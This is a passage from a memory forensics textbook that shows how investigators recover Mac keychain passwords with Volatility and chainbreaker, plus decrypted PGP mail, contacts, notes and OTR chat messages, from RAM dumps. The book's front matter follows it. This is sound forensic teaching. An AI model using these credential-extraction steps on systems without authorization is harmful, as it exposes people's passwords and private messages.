$ python vol.py -f applemail.mem --profile=MacLion_10_7_3_AMDx64 
    mac_keychaindump
Volatility Foundation Volatility Framework 2.4 
Possible Keys
-------------
0000001022A4EE7CC9F7C56F7E54BA66BEC7E017FC070050
c93e598D94D5E995AC6A618203BA61FB53151F1BE672AFCB
c93e598D94D5E995AC6A618203BA61FB53151F1BE672AFCB
602FE30401000000E4ADD97B010000B0982FE30401000000
c93e598D94D5E995AC6A618203BA61FB53151F1BE672AFCB
000000000000000000000000000000000000000000000000
0E783B792E704C8F9D36D3A5810AA3B4B406E095CC13931C
0E783B792E704C8F9D36D3A5810AA3B4B406E095CC13931C
c93e598D94D5E995AC6A618203BA61FB53151F1BE672AFCB
923A8A18D2C26373FE4AD3E0FC5F398181424F9B7115CF10
5501B98B107204AE78511E0BD9B13E93C3C8EBD9660740FE
0B01D227FC0700907215D227FC0700D002001F1BE672AFCB
000000000000000000000000000000000000000000000000
0300000000000000000000000000000000000000C27c00f000
```

As shown, there are various possible keys. You can pass each possibility to chainbreaker in an attempt to decrypt the `login.keychain` file. If the unlocking is successful, all the sensitive information is printed. Otherwise, chainbreaker prints a warning saying the given key is invalid. Note that chainbreaker may print binary data, so it is best to pass the output through strings, as shown here:

```
$ python chainbreaker.py 
        -i login.keychain.0xffffff800adb44d8 
        -k 0E783B792E704C8F9D36D3A5810AA3B4B406E095CC13931C | strings
[+] Generic Password Record
 [-] RecordSize : 0x000000d8
 [-] Record Number : 0x00000000
 [-] SECURE_STORAGE_GROUP(SSGP) Area : 0x0000002c
 [-] Create DateTime: 20120321171408Z
 [-] Last Modified DateTime: 20120321171408Z
 [-] Description :
 [-] Creator : aapl
 [-] Type :
 [-] PrintName : AppleID
 [-] Alias :
 [-] Account : REDACTED@REDACTED.com
 [-] Service : AppleID
 [-] Password: youwish!
[+] Generic Password Record
 [-] RecordSize : 0x000000e0
 [-] Record Number : 0x00000003
 [-] SECURE_STORAGE_GROUP(SSGP) Area : 0x00000024
 [-] Create DateTime: 20140502022715Z
 [-] Last Modified DateTime: 20140502022715Z
 [-] Description :
 [-] Creator :
 [-] Type :
 [-] PrintName : GnuPG
 [-] Alias :
 [-] Account : REDACTED
 [-] Service : GnuPG
 [-] Password:  boom
[+] Internet Record
 [-] RecordSize : 0x0000010c
 [-] Record Number : 0x00000001
 [-] SECURE_STORAGE_GROUP(SSGP) Area : 0x0000002c
 [-] Create DateTime: 20140502014644Z
 [-] Last Modified DateTime: 20140502014644Z
 [-] Description :
 [-] Comment :
 [-] Creator :
 [-] Type :
 [-] PrintName : smtp.gmail.com
 [-] Alias :
 [-] Protected :
 [-] Account : REDACTED@gmail.com
 [-] SecurityDomain :
 [-] Server : smtp.gmail.com
 [-] Protocol Type : kSecProtocolTypeSMTP
 [-] Auth Type : kSecAuthenticationTypeDefault
 [-] Port : 587
 [-] Path :
 [-] Password: allABy323323
```

This keychain file stored the user’s Apple ID (e-mail address) and password. Chainbreaker also revealed the private key password that presumably unlocks the user’s Pretty Good Privacy (PGP) data (the GnuPG entry). Additionally, the user’s Gmail account information is recovered. Not only is this information directly useful but you might also find it indirectly useful if you need to crack open files whose access is *not* managed by Keychain (due to frequent password reuse).

---

**NOTE**

This example searches the memory dump for a file named `login.keychain`. Although it is the default name of the primary keychain, you can change it; users can also add new keychain files with any name they choose.

---

## Mac Application Analysis

Throughout the book, we have emphasized the importance of *structured* analysis, in which the analyst (or analysis tool) is aware of the underlying data structures and formats that an application or operating system uses. Unfortunately, structured analysis of undocumented data formats is time-consuming and often requires reverse-engineering experience. This section shows you how *unstructured* string-based analysis of commonly used Mac applications is also extremely valuable. Prior to writing this section of the book, we had no preexisting knowledge of how any of these applications organized their data in memory. Our research and development efforts consisted of the following steps for each of the targeted applications:

- Plant some *known* artifacts using the application.
- Acquire memory from the computer.
- Search for the planted artifacts (mainly with `mac_yarascan`). Similar to its Windows and Linux counterparts, the `mac_yarascan` plugin allows robust pattern matching throughout process and kernel memory.
- Recognize patterns among the data that can be generalized and used to find other instances of similar data.
- Repeat the steps multiple times to ensure reliability.

Our research was performed on a 10.9.2 (Mavericks) computer. The following output shows that the system was running TweetDeck, Mail, Safari, Contacts, Calendar, Notes, and Adium. These programs are extremely popular and cover a wide range of activity that users under investigation are likely to have engaged in.

```
$ python vol.py --profile=MacMavericks_10_9_2AMDx64 -f suspect.vmem mac_pslist
Volatility Foundation Volatility Framework 2.4 
Offset             Name                 Pid      Uid      Gid      PGID   
------------------ -------------------- -------- -------- -------- -------- 
0xffffff802bd23748 com.apple.qtkits     10194    501      20       10194  
0xffffff802e782bf0 com.apple.audio.     10193    501      20       10193  
0xffffff802c78e047e0 com.apple.audio.     10192    501      20       10192  
0xffffff802e783e90 TweetDeck            10190    501      20       10190  
0xffffff802c78e055d8 com.apple.appsto     10168    501      20       10168 
[snip]
0xffffff802b8e72a0 com.apple.WebKit     10147    501      20       10147   
0xffffff802af742a0 Safari               10145    501      20       10145   
0xffffff802e785130 Contacts             10068    501      20       10068   
0xffffff802e785a80 Calendar             10042    501      20       10042   
0xffffff802ddbf9e8 Mail                 10021    501      20       10021   
0xffffff802ddbf098 Notes                10013    501      20       10013   
0xffffff802bd23bf0 Aduim                10001    501      20       10001   
[snip]
```

In many cases, the research we performed allowed us to create new Volatility plugins. Now, you can investigate systems running the *same* software by just running a plugin. However, the most important lesson you should learn from this section is that you can use the same research methodology to investigate *different* software (for example other e-mail clients, web browsers, and so on).

---

**NOTE**

Although Safari and TweetDeck are running, we do not show analysis of these applications. The “Brute Force URL Scans” section of Chapter 11 explained how to extract URLs from browser memory using a regular expression; and that technique works against Safari. Also, Jeff Bryner wrote a Twitter plugin ([https://github.com/jeffbryner/volatilityPlugins/blob/master/twitter.py](https://github.com/jeffbryner/volatilityPlugins/blob/master/twitter.py)) for Windows processes, which can easily be ported to work on Mac and Linux.

---

### Apple Mail and GPG

This section shows how to find unencrypted PGP e-mail messages sent and received by the Apple Mail e-mail client. The discussion also shares general techniques for recovering e-mail fragments from memory, regardless of the client. To set up the research environment, add a Gmail account to an Apple Mail client integrated with GPG Suite ([https://gpgtools.org/gpgsuite.html](https://gpgtools.org/gpgsuite.html)). Next, send and receive encrypted messages containing the string `FINDME`. Here’s an example of the output from a search we did:

```
$ python vol.py -f suspect.mem --profile=MacMavericks_10_9_2AMDx64
      mac_yarascan -p 10021 -Y "FINDME"

Task: Mail pid 10021 rule r1 addr 0x107420b11
0x0000000107420b11 4649 4e44 4d45 4649 4e44 4d45 4649 4e44 FINDMEFINDMEFIND
0x0000000107420b21 4d45 4649 4e44 4d45 4649 4e44 4d45 4649 MEFINDMEFINDMEFI
0x0000000107420b31 4e44 4d45 3c42 523e 3c2f 626f 6479 3ec0 NDME<BR></body>.
0x0000000107420b41 7c40 0701 0000 0060 7042 0701 0000 0001 |@.....`pB......
0x0000000107420b51 0000 0002 0000 a000 0000 0000 0000 0000 ................
0x0000000107420b61 0000 0001 0000 00b0 4443 0701 0000 0068 ........DC.....h
[snip]
```

Within the hex dump for the hit at `0x107420b11`, you can see the tags (`<BR></body>`) that compose the HTML e-mail message.

#### Finding Plaintext Messages

If you use the `mac_volshell` plugin and look at the addresses surrounding the previously found string in memory, you find another interesting artifact:

```
>>> db(0x107420b11 - 50)
0x107420adf  00 00 00 00 00 00 00 00 00 00 a9 36 07 01 00 00   ...........6....
0x107420aef  00 3c 62 6f 64 79 20 63 6c 61 73 73 3d 27 41 70   .<body.class='Ap
0x107420aff  70 6c 65 50 6c 61 69 6e 54 65 78 74 42 6f 64 79   plePlainTextBody
0x107420b0f  27 3e 46 49 4e 44 4d 45 46 49 4e 44 4d 45 46 49   '>FINDMEFINDMEFI
0x107420b1f  4e 44 4d 45 46 49 4e 44 4d 45 46 49 4e 44 4d 45   NDMEFINDMEFINDME
0x107420b2f  46 49 4e 44 4d 45 3c 42 52 3e 3c 2f 62 6f 64 79   FINDME<BR></body
0x107420b3f  3e c0 7c 40 07 01 00 00 00 60 70 42 07 01 00 00   >.|@.....`pB....
0x107420b4f  00 01 00 00 00 02 00 00 a0 00 00 00 00 00 00 00   ................
```

In this case, the body of the message is wrapped in a class named `ApplePlainTextBody`. By further analyzing other e-mail messages, we confirmed that this class is used when full messages are displayed in the Apple Mail application or when the preview of messages from a particular folder (Inbox, Sent, Trash) is displayed. This means a search for `ApplePlainTextBody` quickly finds all plaintext messages that are present in memory, regardless of whether they were initially encrypted when sent or received.

Another interesting search approach is to find headers related to the Simple Mail Transfer Protocol (SMTP) protocol, which also leads to e-mail messages that were previously sent and received by the application. Here’s an example of searching for the generic subject field:

```
$ python vol.py -f suspect.mem --profile=MacMavericks_10_9_2AMDx64
          mac_yarascan -s 400 -p 1040 -Y "Subject:"

Task: Mail pid 10021 rule r1 addr 0x7ff7cbc8508d
0x00007ff7cbc8508d 5375 626a 6563 743a 2041 5050 4c45 5355  Subject:.Tonight
0x00007ff7cbc8509d 434b 530a 4d69 6d65 2d56 6572 7369 6f6e  ???.Mime-Version
0x00007ff7cbc850ad 3a20 312e 3020 2841 7070 6c65 204d 6573  :.1.0.(Apple.Mes
0x00007ff7cbc850bd 7361 6765 2066 7261 6d65 776f 726b 2076  sage.framework.v
0x00007ff7cbc850cd 3132 3537 290a 582d 5067 702d 4167 656e  1257).X-Pgp-Agen
0x00007ff7cbc850dd 743a 2047 5047 4d61 696c  6e75 6c6c  t:.GPGMail.(null
0x00007ff7cbc850ed 290a 582d 556e 6976 6572 7361 6c6c 792d  ).X-Universally-
0x00007ff7cbc850fd 556e 6971 7565 2d49 6465 6e74 6966 6965  Unique-Identifie
0x00007ff7cbc8510d 723a 2066 3935 3332 3361 362d 3835 3634  r:.f95323a6-8564
0x00007ff7cbc8511d 2d34 3933 332d 3836 6139 2d39 3364 3962  -4933-86a9-93d9b
0x00007ff7cbc8512d 3330 6637 3938 300a 4672 6f6d 3a20 6a61  30c79f080.From:.ja
0x00007ff7cbc8513d 6d61 6c20 XXXX XXXX XXXX XXXX XXXX XX40  mal.<xxxxxxxxxx@
0x00007ff7cbc8514d 676d 6169 6c2e 636f 6d3e 0a44 6174 653a  gmail.com>.Date:
0x00007ff7cbc8515d 2054 6875 2c20 3120 4d61 7920 3230 3134  .Thu,.1.May.2014
0x00007ff7cbc8516d 2032 313a 3237 3a34 3720 2d30 3530 300a  .21:27:47.-0500.
0x00007ff7cbc8517d 436f 6e74 656e 742d 5472 616e 7366 6572  Content-Transfer
0x00007ff7cbc8518d 2d45 6e63 6f64 696e 673a 2037 6269 740a  -Encoding:.7bit.
<snip>
Task: Mail pid 10021 rule r1 addr 0x7ff7cc9a7898
0x00007ff7cc9a7898 5375 626a 6563 743a 2041 4243 0a4d 696d  Subject:.Tom.Mim
0x00007ff7cc9a78a8 652d 5665 7273 696f 6e3a 2031 2e30   e-Version:.1.0.(
0x00007ff7cc9a78b8 4170 706c 6520 4d65 7373 6167 6520 6672  Apple.Message.fr
0x00007ff7cc9a78c8 616d 6577 6f72 6b20 7631 3235 3729 0a58  amework.v1257).X
0x00007ff7cc9a78d8 2d50 6770 2d41 6765 6e74 3a20 4750 474d  -Pgp-Agent:.GPGM
0x00007ff7cc9a78e8 6169 6c20 286e 756c 6c29 0a58 2d55 6e69  ail.(null).X-Uni
0x00007ff7cc9a78f8 7665 7273 616c 6c79 2d55 6e69 7175 652d  versally-Unique-
0x00007ff7cc9a7908 4964 656e 7469 6669 6572 3a20 3064 3137  Identifier:.0d17
0x00007ff7cc9a7918 6261 3231 2d30 3230 382d 3464 6337 2d38  ba21-0208-4dc7-8
0x00007ff7cc9a7928 3861 372d 3438 3134 3131 3764 6639 6339  8a7-4814117df9c9
0x00007ff7cc9a7938 0a46 726f 6d3a 206a 616d 616c 203c XXXX  .From:.jamal.<XX
0x00007ff7cc9a7948 XXXX XXXX XXXX XXXX 4067 6d61 696c 2e63  XXXXXXXX@gmail.c
0x00007ff7cc9a7958 6f6d 3e0a 4461 7465 3a20 5468 752c 2031  om>.Date:.Thu,.1
<snip>
```

In the output, other headers follow the subject, such as the date of the message and the sender. You can then use `mac_volshell` to explore the entire message contents, including the body.

#### Locating E-mail Attachments

If you want to find e-mails with attachments (and potentially the attachment contents, depending on its size), you can search for `Content-Disposition: attachment`. It is the header used to denote information about attachments. The following output shows the recovery of an e-mail in which the user sent his public key as an attachment to a third party.

```
Task: Mail pid 10021 rule r1 addr 0x7ff7dbbb74f2
0x7ff7dbbb74f2  43 6f 6e 74 65 6e 74 2d 44 69 73 70 6f 73 69 74 Content-Disposit
0x7ff7dbbb7502  69 6f 6e 3a 20 61 74 74 61 63 68 6d 65 6e 74 3b ion:.attachment;
0x7ff7dbbb7512  0a 09 66 69 6c 65 6e 61 6d 65 3d 73 69 67 6e 61 ..filename=signa
0x7ff7dbbb7522  74 75 72 65 2e 61 73 63 0a 43 6f 6e 74 65 6e 74 ture.asc.Content
0x7ff7dbbb7532  2d 54 79 70 65 3a 20 61 70 70 6c 69 63 61 74 69 -Type:.applicati
0x7ff7dbbb7542  6f 6e 2f 70 67 70 2d 73 69 67 6e 61 74 75 72 65 on/pgp-signature
0x7ff7dbbb7552  3b 0a 09 6e 61 6d 65 3d 73 69 67 6e 61 74 75 72 ;..name=signatur
0x7ff7dbbb7562  65 2e 61 73 63 0a 43 6f 6e 74 65 6e 74 2d 44 65 e.asc.Content-De
0x7ff7dbbb7572  73 63 72 69 70 74 69 6f 6e 3a 20 4d 65 73 73 61 scription:.Messa
0x7ff7dbbb7582  67 65 20 73 69 67 6e 65 64 20 77 69 74 68 20 4f ge.signed.with.O
0x7ff7dbbb7592  70 65 6e 50 47 50 20 75 73 69 6e 67 20 47 50 47 penPGP.using.GPG
0x7ff7dbbb75a2  4d 61 69 6c 0a 0a 2d 2d 2d 2d 2d 42 45 47 49 4e Mail..-----BEGIN
0x7ff7dbbb75b2  20 50 47 50 20 53 49 47 4e 41 54 55 52 45 2d 2d .PGP.SIGNATURE--
0x7ff7dbbb75c2  2d 2d 2d 0a 43 6f 6d 6d 65 6e 74 3a 20 47 50 47 ---.Comment:.GPG
0x7ff7dbbb75d2  54 6f 6f 6c 73 20 2d 20 68 74 74 70 73 3a 2f 2f Tools.-.https://
0x7ff7dbbb75e2  67 70 67 74 6f 6f 6c 73 2e 6f 72 67 0a 0a 69 51 gpgtools.org..iQ
```

You can see the name of the attachment is `signature.asc` and the beginning of the ASCII-armored public key (the attachment’s contents) after the name. For investigations in which a user has deleted an attachment from both his mail client and local disk, memory might be the only place to find remnants of the sent or received file.

#### Mail Account Passwords

You can also attempt to find passwords of user accounts configured within Apple Mail. For example, if the user does not save passwords in Keychain, the e-mail client’s address space might be the only source of the password. Through our testing, we determined that both the username and password to each configured account often appears near “SignRecover” in memory. We made this determination by searching for the e-mail address we created and then noticing the password right after it. We then explored memory with `mac_volshell` and saw the “SignRecover” string above it.

### Apple Contacts

This section shows how to extract a user’s contacts from the Apple Contacts application. Our example has five contacts in the test environment, including the default entry that Apple creates for Apple Inc. While researching this application, we first scanned the process’ address space for two of our contact names (“Alex Hart” and “Robin Hood”). This led to data containing the phone numbers, e-mail addresses, and other associated details. However, this technique requires an investigator to know the names of the suspect’s contacts beforehand.

An alternate approach involves finding SQLite3 database files mapped into memory. Within the binary database format, contact names are always preceded with an identifying string (`:ABPerson`). Based on this knowledge, we built a Volatility plugin named `mac_contacts` that finds contact names in the described manner. Here’s an example of the output:

```
$ python vol.py --profile=MacMavericks_10_9_2AMDx64 -f suspect.vmem 
    mac_contacts -p 10042
Volatility Foundation Volatility Framework 2.4 

AlexHartalex hart Alex Hart hart alex Hart Alex
JaneSmithjane smith Jane Smith smith jane Smith Jane
DrWongDr Wong and Associatesdr wong Dr Wong wong
Apple Inc.apple inc. Apple Inc. apple inc. Apple
RobinHoodrobin hood Robin Hood hood robin Hood Robin
```

Now you can identify the five contacts. The names are in various formats with regard to the ordering of the first name and last name, in addition to lowercase versus uppercase letters, because that’s how they exist in the database. Strangely, the database seems to contain only names, not the actual contact information. Thus, the second step, which isn’t yet automated in the plugin, involves searching for the names in memory. Here’s an example:

```
$ python vol.py --profile=MacMavericks_10_9_2AMDx64 -f suspect.vmem 
      mac_yarascan -Y "alex hart" -p 10068
Volatility Foundation Volatility Framework 2.4 
Task: Contacts pid 10068 rule r1 addr 0x10e05af9c
0x000000010e05af9c  616c 6578 2068 6172 7420 416c 6578 2048   alex.hart.Alex.H
0x000000010e05afac  6172 7420 071a 0339 016a 616e 6520 736d   art....9.jane.sm
0x000000010e05afbc  6974 6820 4a61 6e65 2053 6d69 7468 2006   ith.Jane.Smith..
0x000000010e05afcc  1403 2d01 6472 2077 6f6e 6720 4472 2057   ..-.dr.wong.Dr.W
Task: Contacts pid 10068 rule r1 addr 0x10e0faf0a
0x000000010e0faf0a  616c 6578 2068 6172 7420 616c 6578 6861   alex.hart.alexha
0x000000010e0faf1a  7274 4067 6d61 696c 2e63 6f6d 2034 3530   rt@gmail.com.450
0x000000010e0faf2a  3039 3837 3231 3320 3435 3030 3938 3732   0987213.45009872
0x000000010e0faf3a  3133 202b 0407 0001 0901 014f 0306 136a   13.+.......O...
[snip[
```

Our example received several hits, but the important one is shown at address `0x10e0faf0a`. The contact’s e-mail address (`alexhart@gmail.com`) and telephone number (`450-098-7213`) are exposed. You don’t have to search for each contact individually because they’re actually grouped together. For example, you can use `mac_volshell` and adjust the amount of data in the preview, like this:

```
$ python vol.py --profile=Mac10_9_2x64 -f suspect.vmem mac_volshell -p 10068
Volatility Foundation Volatility Framework 2.4
Current context: process Contacts, pid=10068 DTB=0x5902f000
Python 2.7.6 (v2.7.6:3a1db0d2747e, Nov 10 2013, 00:42:54) 

>>> db(0x000000010e0faf0a, length = 400)
0x10e0faf0a  616c 6578 2068 6172 7420 616c 6578 6861   alex.hart.alexha
0x10e0faf1a  7274 4067 6d61 696c 2e63 6f6d 2034 3530   rt@gmail.com.450
0x10e0faf2a  3039 3837 3231 3320 3435 3030 3938 3732   0987213.45009872
0x10e0faf3a  3133 202b 0407 0001 0901 014f 0306 136a   13.+.......O...j
0x10e0faf4a  616e 6520 736d 6974 6820 3435 3036 3738   ane.smith.450678
0x10e0faf5a  3033 3333 2034 3530 3637 3830 3333 3320   0333.4506780333.
0x10e0faf6a  5503 0800 0109 0101 8121 0305 1364 7220   U........!...dr.
0x10e0faf7a  776f 6e67 2064 7220 776f 6e67 2061 6e64   wong.dr.wong.and
0x10e0faf8a  2061 7373 6f63 6961 7465 7320 776f 6e67   .associates.wong
0x10e0faf9a  4074 6865 776f 6e67 6272 6f73 2e63 6f6d   @thewongbros.com
0x10e0fafaa  2034 3530 3536 3738 3934 3420 3435 3035   .4505678944.4505
0x10e0fafba  3637 3839 3434 2077 0208 0001 0901 0181   678944.w........
0x10e0fafca  6503 0413 6170 706c 6520 696e 632e 2068   e...apple.inc..h
0x10e0fafda  7474 703a 2f2f 7777 772e 6170 706c 652e   ttp://www.apple.
0x10e0fafea  636f 6d20 3120 696e 6669 6e69 7465 206c   com.1.infinite.l
0x10e0faffa  6f6f 7020 6375 7065 7274 696e 6f20 6361   oop.cupertino.ca
0x10e0fb00a  2039 3530 3134 2075 6e69 7465 6420 7374   .95014.united.st
0x10e0fb01a  6174 6573 2031 2d38 3030 2d6d 792d 6170   ates.1-800-my-ap
0x10e0fb02a  706c 6520 3138 3030 6d79 6170 706c 6520   ple.1800myapple.
0x10e0fb03a  1401 0700 0109 0901 2303 1372 6f62 696e   ........#..robin
0x10e0fb04a  2068 6f6f 6420 f008 5379 a27f 0000 0a00   .hood...Sy......
```

At this point, you can recover the user’s contacts and associated details. The next time a suspect claims that she has never heard of a particular person, you can use `mac_contacts` and `mac_yarascan` to prove otherwise!

---

**NOTE**

We extracted the SQLite3 database file from memory using the `mac_dump_file` plugin, but it was corrupted (and non-repairable) most likely due to missing, swapped pages. Otherwise, we could have just queried the database file directly.

---

### Apple Calendar

This section shows how to recover *rudimentary* details from Apple Calendar. To set up this analysis, we created an event named “Book release party” in the Calendar application. We also created a few other personal events (reminders for birthdays and training courses) and enabled the shared/public U.S. Holidays calendar.

According to our research, you can find information on calendar events in multiple locations. For example, we found some references within kernel memory and also inside the Calendar process’ address space. In particular, the names of the events were situated near strings that resemble Globally Unique Identifiers (GUIDs), such as `9399FF3F-CD7C-46CE-A692-C7B2B5AD9FEA`. We built a regular expression that finds the GUIDs and then locates the nearby event information. This methodology was implemented into the `mac_calendar` plugin, which is shown in the following command.

```
$ python vol.py --profile=Mac10_9_2x64 -f suspect.vmem mac_calendar -p 10042
Volatility Foundation Volatility Framework 2.4 
Source           Description            Event
---------------- ---------------------- -----
(Kernel)         (None)                 America/Los_Angeles Doctor Wong
(Kernel)         (None)                 America/Los_Angeles Training Class 
(Kernel)         (None)                 America/Los_Angeles Mike's birthday
(Kernel)         (None)                 America/Los_Angeles Mom's birthday
(Kernel)         Be there or be square  America/Los_Angeles Book release party
Calendar(10042)  (None)                 Flag Day
Calendar(10042)  (None)                 Halloween
Calendar(10042)  (None)                 Cinco de Mayo
Calendar(10042)  (None)                 Christmas Day
Calendar(10042)  (None)                 Independence Day
[snip]
```

The description and location of the event (if available) is displayed along with the event name. Unfortunately, some of the data between the event name and GUID is binary. We haven’t yet translated the values or determined their meaning, but they presumably contain the dates and times of the events (this is unconfirmed).

### Apple Notes

This section shows how to recover notes, reminders, and messages from Apple Notes. Our research concluded that the content of a note is embedded in HTML tags and saved on the application’s heap. Thus, it is possible to build a Volatility plugin (`mac_notesapp`) that searches for HTML code within the heap segments and dumps them to disk. Here’s an example of extracting notes using this plugin:

```
$ python vol.py -f suspect.vmem --profile=MacMavericks_10_9_2AMDx64 mac_notesapp 
      -p 10013 -D dump
Volatility Foundation Volatility Framework 2.4
Pid      Name     Start              Size     Path
-------- -------- ------------------ -------- ----
10013    Notes    0x00006080001ab6e0    179   dump/Notes.10013.6080001ab6e0.txt
10013    Notes    0x00007f80d2829c0f    232   dump/Notes.10013.7f80d2829c0f.txt
```

This plugin found two notes and named them according to the Note application’s process ID (PID), 10013, and the address of the HTML code (`0x00006080001ab6e0`). We then used the `xmllint` command to display the note within the terminal. The only difference between `xmllint` and `cat` in this case is that `xmllint` formats the HTML in a “pretty” manner rather than one long string.

```
$ xmllint --html dump/Notes.10013.6080001ab6e0.txt
<html>
<head></head>
<body>Interview details<div>
<ul class="Apple-dash-list">
<li>2 PM</li>
<li>1124 Southmore Blvd.</li>
<li>304.444.1939&nbsp;</li>
</ul>
<div><br></div>
<div>Wear black shoes&nbsp;</div>
<div><br></div>
</div>
</body>
</html>
```

### Adium Chat Messages

Adium is a popular chat client because it supports a wide range of protocols including Jabber, Google Talk, Facebook, and MSN Messenger. Also, it allows OTR to support end-to-end encryption of messages. This section shows how to recover chat conversations from memory, even when Adium’s internal logging is disabled and OTR is in effect. Similar to several other applications in this chapter, you can easily find the evidence within Adium’s memory by searching for specific markup language tags. For example, the `mac_adium` plugin extracts evidence in two formats:

- **Messages formatted according to the chat protocol:** Found within `<message></message>` tags and are later wrapped (or unwrapped) in network packets sent to and from the chat client.
- **Messages formatted for display in an active Adium chat window:** The plugin finds `<span></span>` tags with `x-message`, `x-ltime`, and `x-sender` class names.

An example of the way output from the `mac_adium` plugin appears is as follows. The plugin should be passed the name of a dump directory and the process ID of the Adium client:

```
$ python vol.py -f suspect.vmem --profile=Mac10_9_2x64 mac_adium 
    --pid 10001 --dump-dir dump
Volatility Foundation Volatility Framework 2.4 
Pid      Name       Start              Size     Path
-------- ---------- ------------------ -------- ----
10001    Adium      0x00000001030dfb74      163 dump/Adium.10001.1030dfb74.txt
10001    Adium      0x00000001030dfc15      378 dump/Adium.10001.1030dfc15.txt
10001    Adium      0x00000001030dfd8d      162 dump/Adium.10001.1030dfd8d.txt
10001    Adium      0x00000001030dfe2d      304 dump/Adium.10001.1030dfe2d.txt
10001    Adium      0x00000001030dff5b      577 dump/Adium.10001.1030dff5b.txt
10001    Adium      0x00000001030e019a      162 dump/Adium.10001.1030e019a.txt
10001    Adium      0x00000001030e023a      969 dump/Adium.10001.1030e023a.txt
[snip]
```

This plugin identifies several chats and extracts them to individual text files. The following command shows how to reveal the content inside one of the *chat protocol* tags:

```
$ cat dump/Adium.10001.109a5e202.txt
<message type='chat' id='purple8cc81e053e' to='XXXXX@gmail.com'>
<active xmlns='http://jabber.org/protocol/chatstates'/>
<body>What are you doing on Saturday?</body>
</message>
```

The bold fields tell you the recipient of the message and the message body. However, these entries do not contain timestamps. In the next example, an OTR message was recovered from within `<span></span>` tags. As previously mentioned, these items are intended for display in the Adium user interface. Thus, even when the content is encrypted over the network, it is decrypted before reaching the recipient’s chat window. Another subtle difference is that this content is in Unicode, so we convert it using the `iconv` command, like this:

```
$ iconv -f UTF-8 -t ISO-8859-1 Adium.429.109e1e59c.txt
<span class="x-ltime" title="03 May 2014">2:57:49</span>
<span class="x-message" title="2:57">THIS_WAS_SENT_BY_ME_THROUGH_OTR</span>
```

The body of the message is enclosed in the `x-message` span class, and the timestamp is within the `x-ltime` span class. Currently, we don’t have a reliable method to distinguish whether a message was initially encrypted or not because it appears in plain text either way.

## Summary

A major part of Mac investigations often involves trying to determine what a user was doing on the system and if those actions may have lead to the system being compromised. A lot of this data is typically stored within software applications such as browsers, chat programs, e-mail clients, cloud services, and so on. An important component of these types of investigation involves analyzing the memory resident application artifacts. Memory forensics also offers the ability to extract encryption artifacts that could unlock valuable details about the investigation. While memory analysis of applications is an area of open research, it is important for digital investigators to have the tools and techniques for finding and extracting those types of artifacts.
# **The Art of Memory Forensics**

## Detecting Malware and Threats in Windows, Linux, and Mac Memory

Michael Hale Ligh

Andrew Case

Jamie Levy

AAron Walters

![Logo](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/book_art/Wiley_Wordmark_white_fmt.gif)
# Copyright

**The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory**

Published by John Wiley & Sons, Inc.10475 Crosspoint BoulevardIndianapolis, IN 46256[www.wiley.com](http://www.wiley.com)

Copyright © 2014 by John Wiley & Sons, Inc., Indianapolis, Indiana

Published simultaneously in Canada

ISBN: 978-1-118-82509-9

ISBN: 978-1-118-82504-4 (ebk)

ISBN: 978-1-118-82499-3 (ebk)

Manufactured in the United States of America

10 9 8 7 6 5 4 3 2 1

No part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or by any means, electronic, mechanical, photocopying, recording, scanning or otherwise, except as permitted under Sections 107 or 108 of the 1976 United States Copyright Act, without either the prior written permission of the Publisher, or authorization through payment of the appropriate per-copy fee to the Copyright Clearance Center, 222 Rosewood Drive, Danvers, MA 01923, (978) 750-8400, fax (978) 646-8600. Requests to the Publisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ 07030, (201) 748-6011, fax (201) 748-6008, or online at [http://www.wiley.com/go/permissions](http://www.wiley.com/go/permissions).

**Limit of Liability/Disclaimer of Warranty:** The publisher and the author make no representations or warranties with respect to the accuracy or completeness of the contents of this work and specifically disclaim all warranties, including without limitation warranties of fitness for a particular purpose. No warranty may be created or extended by sales or promotional materials. The advice and strategies contained herein may not be suitable for every situation. This work is sold with the understanding that the publisher is not engaged in rendering legal, accounting, or other professional services. If professional assistance is required, the services of a competent professional person should be sought. Neither the publisher nor the author shall be liable for damages arising herefrom. The fact that an organization or Web site is referred to in this work as a citation and/or a potential source of further information does not mean that the author or the publisher endorses the information the organization or website may provide or recommendations it may make. Further, readers should be aware that Internet websites listed in this work may have changed or disappeared between when this work was written and when it is read.

For general information on our other products and services please contact our Customer Care Department within the United States at (877) 762-2974, outside the United States at (317) 572-3993 or fax (317) 572-4002.

Wiley publishes in a variety of print and electronic formats and by print-on-demand. Some material included with standard print versions of this book may not be included in e-books or in print-on-demand. If this book refers to media such as a CD or DVD that is not included in the version you purchased, you may download this material at [http://booksupport.wiley.com](http://booksupport.wiley.com). For more information about Wiley products, visit [www.wiley.com](http://www.wiley.com).

**Library of Congress Control Number:** 2014935751

**Trademarks:** Wiley and the Wiley logo are trademarks or registered trademarks of John Wiley & Sons, Inc. and/or its affiliates, in the United States and other countries, and may not be used without written permission. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated with any product or vendor mentioned in this book.
# Dedication

*To my three best friends: Suzanne, Ellis, and Miki. If I could take back the time it took to write this book, I’d spend every minute with you. Looking forward to our new house!*

—Michael Hale Ligh

*I would like to thank my wife, Jennifer, for her patience during my many sleepless nights and long road trips. I would also like to thank my friends and family, both in the physical and digital world, who have helped me get to where I am today.*

—Andrew Case

*To my family, who made me the person I am today, and especially to my husband, Tomer, the love of my life, without whose support I wouldn’t be here.*

—Jamie Levy

*To my family for their unconditional support; to my wife, Robyn, for her love and understanding; and to Addisyn and Declan for reminding me what is truly important and creating the only memories that matter.*

—AAron Walters
# About the Authors

**Michael Hale Ligh** ([@iMHLv2](http://www.twitter.com/iMHLv2)**)** is author of *Malware Analyst’s Cookbook* and secretary-treasurer of the Volatility Foundation. As both a developer and reverse engineer, his focus is malware cryptography, memory forensics, and automated analysis. He has taught advanced malware and memory forensics courses to students around the world.

**Andrew Case** ([@attrc](http://www.twitter.com/attrc)) is digital forensics researcher for the Volatility Project responsible for projects related to memory, disk, and network forensics. He is the co-developer of Registry Decoder (a National Institute of Justice–funded forensics application) and was voted Digital Forensics Examiner of the Year in 2013. He has presented original memory forensics research at Black Hat, RSA, and many others.

**Jamie Levy** ([@gleeda](http://www.twitter.com/gleeda)) is senior researcher and developer with the Volatility Project. Jamie has taught classes in computer forensics at Queens College and John Jay College. She is an avid contributor to the open-source computer forensics community, and has authored peer-reviewed conference publications and presented at numerous conferences on the topics of memory, network, and malware forensics analysis.

